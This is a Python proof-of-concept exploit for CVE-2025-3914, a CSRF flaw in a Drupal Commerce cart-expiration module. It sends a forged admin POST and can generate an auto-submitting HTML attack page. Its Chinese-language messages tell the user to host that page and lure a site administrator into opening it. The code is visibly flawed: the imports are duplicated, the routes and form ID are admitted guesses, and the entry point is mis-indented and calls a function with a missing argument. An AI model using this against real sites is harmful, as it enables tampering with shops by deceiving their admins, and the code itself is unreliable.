#!/usr/bin/env python3
# coding:utf-8
import requests
import sys
#!/usr/bin/env python3
# coding:utf-8
import requests
import argparse
import sys
from urllib.parse import urljoin

def poc(url, cart_machine_name):
    """
    PoC for CVE-2025-3914: Commerce Cart Expiration CSRF Vulnerability
    Attempts to send a malicious POST request to modify cart expiration settings.
    """
    try:
        # Construct the vulnerable endpoint (hypothetical, based on module functionality)
        # Adjust the path based on actual module routes if known
        target_url = urljoin(url, "/admin/commerce/config/cart-expiration/update")

        # Craft payload to modify cart expiration settings
        # Example: Change expiration time to 1 hour (3600 seconds)
        payload = {
            "cart_machine_name": cart_machine_name,
            "expiration_time": "3600",  # Example value
            "form_id": "commerce_cart_expiration_form",  # Hypothetical form ID
            "_triggering_element_name": "op",
            "_triggering_element_value": "Save configuration"
        }

        # Send POST request to simulate CSRF attack
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)

        # Check response for success indicators
        # Since CSRF doesn't return direct feedback, we look for HTTP 200 or redirect
        if response.status_code in [200, 302]:
            print(f"[+] [{url}] 可能存在 CVE-2025-3914 CSRF 漏洞！")
            print(f"[+] 请求已发送，检查目标站点是否更改了购物车 '{cart_machine_name}' 的过期设置。")
            return True
        else:
            print(f"[-] [{url}] 未检测到 CVE-2025-3914 漏洞（状态码: {response.status_code}）。")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] [{url}] 请求失败: {str(e)}")
        return False

def generate_csrf_html(url, cart_machine_name):
    """
    Generate an HTML page to trick an admin into triggering the CSRF attack.
    """
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>CSRF PoC for CVE-2025-3914</title>
    </head>
    <body onload="document.forms[0].submit()">
        <h1>CSRF PoC for Commerce Cart Expiration</h1>
        <form action="{urljoin(url, '/admin/commerce/config/cart-expiration/update')}" method="POST">
            <input type="hidden" name="cart_machine_name" value="{cart_machine_name}">
            <input type="hidden" name="expiration_time" value="3600">
            <input type="hidden" name="form_id" value="commerce_cart_expiration_form">
            <input type="hidden" name="_triggering_element_name" value="op">
            <input type="hidden" name="_triggering_element_value" value="Save configuration">
        </form>
        <p>This page will automatically submit a request to test CVE-2025-3914.</p>
    </body>
    </html>
    """
    with open("cve_2025_3914_csrf.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    print(f"[*] 已生成 CSRF 攻击页面: cve_2025_3914_csrf.html")
    print(f"[*] 请将此页面托管在服务器上，并诱导目标管理员访问。")

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-3914 (Commerce Cart Expiration CSRF)")
    parser.add_argument("--url", required=True, help="目标 Drupal 站点 URL（例如 http://example.com）")
    parser.add_argument("--cart", required=True, help="购物车机器名称（machine name）")
    parser.add_argument("--generate-html", action="store_true", help="生成 CSRF 攻击 HTML 页面")
    args = parser.parse_args()

    print(f"[*] 测试 CVE-2025-3914 漏洞: {args.url}")
    print(f"[*] 购物车机器名称: {args.cart}")

    if args.generate_html:
        generate_csrf_html(args.url, args.cart)
    else:
        result = poc(args.url, args.cart)
        if result:
            print(f"[*] 建议升级 Commerce Cart Expiration 模块到 2.0.2 或更高版本。")
            print(f"[*] 参考: https://www.drupal.org/sa-contrib-2025-029")


    if __name__ == "__main__":
        url = " http://127.0.0.1:8080"
        poc(url)